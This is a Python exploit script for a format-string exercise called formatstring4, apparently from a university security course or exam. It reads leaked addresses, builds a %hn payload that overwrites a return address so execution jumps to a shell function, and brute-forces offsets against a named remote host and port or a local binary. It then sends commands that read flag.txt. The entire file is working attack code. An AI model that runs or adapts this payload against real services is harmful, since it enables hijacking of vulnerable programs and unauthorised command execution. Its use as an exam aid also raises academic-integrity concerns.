#!/usr/bin/env python3
"""
Exam-friendly helper for formatstring4.

Default use:
    python exploit.py

What it does:
- reads the live leak
- identifies the jump function address and buffer address
- tries a small set of common return-address offsets
- stops when it sees the success marker and flag output

Optional overrides:
    --mode local|remote   force one target
    --ret-offset 48       use one specific return-address offset
    --cmd '...'           replace the default shell command block
"""

from __future__ import annotations

import argparse
import re
import socket
import struct
import subprocess
from typing import Iterable

HOST = "moa6.eecs.utk.edu"
PORT = 32150
BINARY = "./jump"
SUCCESS_MARKER = "FS4_OK"
DEFAULT_CMD = f"echo {SUCCESS_MARKER}\ncat flag.txt 2>/dev/null || true\nexit\n"
HEX_SPLIT_RE = re.compile(r"[^0-9a-fA-Fx]+")
EXACT_LEAK_RE = re.compile(
    r"function\s+(?:0x)?([0-9a-fA-F]{7,8}),\s*(?:0x)?([0-9a-fA-F]{7,8}).*teleport",
    re.IGNORECASE,
)


def is_code_addr(value: int) -> bool:
    return 0x08000000 <= value < 0x09000000


def is_stack_addr(value: int) -> bool:
    return 0xFF000000 <= value <= 0xFFFFFFFF


def parse_leaks(text: str) -> tuple[int, int]:
    """Extract jump() and buffer addresses from a banner.

    The parser is intentionally loose: it accepts the current wording and any
    similar line that contains a code address plus a stack address.
    """
    exact = EXACT_LEAK_RE.search(text)
    if exact:
        return int(exact.group(1), 16), int(exact.group(2), 16)

    for line in text.splitlines():
        tokens: list[str] = []
        for raw_token in HEX_SPLIT_RE.split(line):
            if not raw_token:
                continue
            token = raw_token[2:] if raw_token.lower().startswith("0x") else raw_token
            if 6 <= len(token) <= 8 and all(
                ch in "0123456789abcdefABCDEF" for ch in token
            ):
                tokens.append(token)
        if len(tokens) < 2:
            continue

        values = [int(token, 16) for token in tokens]
        if "teleport" in line.lower() and any(
            keyword in line.lower() for keyword in ("function", "jump")
        ):
            if len(values) >= 2:
                return values[0], values[1]

    raise RuntimeError("Could not parse leaked jump and buffer addresses")


def build_payload(
    jump_addr: int, buffer_addr: int, ret_offset: int
) -> tuple[bytes, dict[str, int]]:
    ret_addr = buffer_addr + ret_offset
    high = (jump_addr >> 16) & 0xFFFF
    low = jump_addr & 0xFFFF

    addr1 = ret_addr + 2
    addr2 = ret_addr

    already = 8
    pad1 = (high - already) % 0x10000
    pad2 = (low - high) % 0x10000

    fmt = f"%{pad1}c%1$hn%{pad2}c%2$hn".encode("ascii")
    payload = struct.pack("<I", addr1) + struct.pack("<I", addr2) + fmt

    details = {
        "jump_addr": jump_addr,
        "buffer_addr": buffer_addr,
        "ret_addr": ret_addr,
        "ret_offset": ret_offset,
        "high": high,
        "low": low,
        "pad1": pad1,
        "pad2": pad2,
        "addr1": addr1,
        "addr2": addr2,
        "payload_len": len(payload),
    }
    return payload, details


def print_steps(d: dict[str, int]) -> None:
    print("[step] jump        = 0x%08x" % d["jump_addr"])
    print("[step] buffer      = 0x%08x" % d["buffer_addr"])
    print(
        "[step] ret_addr    = buffer + %d = 0x%08x" % (d["ret_offset"], d["ret_addr"])
    )
    print("[step] high/low    = 0x%04x / 0x%04x" % (d["high"], d["low"]))
    print(
        "[step] write addrs = addr1(ret+2)=0x%08x, addr2(ret)=0x%08x"
        % (d["addr1"], d["addr2"])
    )
    print("[step] paddings    = pad1=%d, pad2=%d" % (d["pad1"], d["pad2"]))
    print("[step] payload len = %d (must be 31)" % d["payload_len"])


def read_until_leaks_local(proc: subprocess.Popen[bytes]) -> str:
    out = b""
    while True:
        if proc.stdout is None:
            raise RuntimeError("failed to open local stdout pipe")
        ch = proc.stdout.read(1)
        if not ch:
            break
        out += ch
        text = out.decode("latin1", errors="ignore")
        try:
            parse_leaks(text)
            return text
        except RuntimeError:
            continue

    raise RuntimeError("local binary ended before leak could be parsed")


def read_until_leaks_remote(sock: socket.socket) -> str:
    out = b""
    while True:
        ch = sock.recv(1)
        if not ch:
            break
        out += ch
        text = out.decode("latin1", errors="ignore")
        try:
            parse_leaks(text)
            return text
        except RuntimeError:
            continue

    raise RuntimeError("remote target ended before leak could be parsed")


def run_local_once(ret_offset: int, cmd: bytes) -> str:
    p = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    banner = read_until_leaks_local(p)
    jump_addr, buffer_addr = parse_leaks(banner)
    payload, details = build_payload(jump_addr, buffer_addr, ret_offset)
    print_steps(details)

    if p.stdin is None:
        raise RuntimeError("failed to open local stdin pipe")

    p.stdin.write(payload + cmd)
    p.stdin.flush()
    p.stdin.close()

    if p.stdout is None:
        raise RuntimeError("failed to reopen local stdout pipe")

    rest = p.stdout.read().decode("latin1", errors="ignore")
    return banner + rest


def run_remote_once(ret_offset: int, cmd: bytes, host: str, port: int) -> str:
    sock = socket.create_connection((host, port), timeout=8)
    sock.settimeout(6)

    banner = read_until_leaks_remote(sock)
    jump_addr, buffer_addr = parse_leaks(banner)
    payload, details = build_payload(jump_addr, buffer_addr, ret_offset)
    print_steps(details)

    sock.sendall(payload + cmd)

    body = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            body += chunk
    except socket.timeout:
        pass
    finally:
        sock.close()

    return banner + body.decode("latin1", errors="ignore")


def run_once(mode: str, ret_offset: int, cmd: bytes, host: str, port: int) -> str:
    if mode == "local":
        return run_local_once(ret_offset, cmd)
    if mode == "remote":
        return run_remote_once(ret_offset, cmd, host, port)
    raise ValueError(f"unknown mode: {mode}")


def choose_offsets(ret_offset: int | None) -> Iterable[int]:
    if ret_offset is not None:
        return (ret_offset,)
    return tuple(range(32, 97, 4))


def main() -> None:
    ap = argparse.ArgumentParser(description="formatstring4 exam helper")
    ap.add_argument(
        "--mode",
        dest="mode_flag",
        choices=["auto", "local", "remote"],
        default=None,
        help="target mode (default: auto, remote first)",
    )
    ap.add_argument(
        "mode",
        nargs="?",
        choices=["auto", "local", "remote"],
        default=None,
        help="target mode (default: auto, remote first)",
    )
    ap.add_argument(
        "--ret-offset",
        type=int,
        default=None,
        help="force one return-address offset instead of scanning common values",
    )
    ap.add_argument(
        "--host",
        default=HOST,
        help="remote host (default: moa6.eecs.utk.edu)",
    )
    ap.add_argument(
        "--port",
        type=int,
        default=PORT,
        help="remote port (default: 32150)",
    )
    ap.add_argument(
        "--cmd",
        default=DEFAULT_CMD,
        help="command block sent to the spawned shell",
    )
    args = ap.parse_args()

    mode = args.mode_flag or args.mode or "auto"
    cmd = args.cmd.encode("ascii")
    offsets = list(choose_offsets(args.ret_offset))
    modes = [mode]
    if mode == "auto":
        modes = ["remote", "local"]

    last_error: Exception | None = None
    for mode in modes:
        for ret_offset in offsets:
            print(f"[*] trying mode={mode} ret_offset={ret_offset}")
            try:
                output = run_once(mode, ret_offset, cmd, args.host, args.port)
            except Exception as exc:
                last_error = exc
                print(f"[!] {exc}")
                continue

            print(output)
            if SUCCESS_MARKER in output:
                return

            print("[!] success marker not found, trying next offset")

    if last_error is not None:
        raise last_error
    raise RuntimeError("exploit did not succeed with any tested offset")


if __name__ == "__main__":
    main()
